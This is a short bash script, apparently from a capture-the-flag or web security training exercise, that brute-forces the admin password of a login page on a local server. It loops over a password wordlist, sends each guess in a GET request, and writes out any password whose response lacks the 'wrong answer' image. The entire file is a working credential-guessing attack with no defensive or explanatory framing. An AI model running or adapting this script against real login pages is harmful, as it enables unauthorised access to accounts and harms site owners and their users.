#!/bin/bash

while IFS= read -r pwd; do
    response=$(curl "http://127.0.0.1:8000/?page=signin&username=admin&password=${pwd}&Login=Login")
    if [[ ! $(echo ${response} | grep "images/WrongAnswer.gif") ]]; then
        echo $pwd > output
    fi
done < "./pwdlist"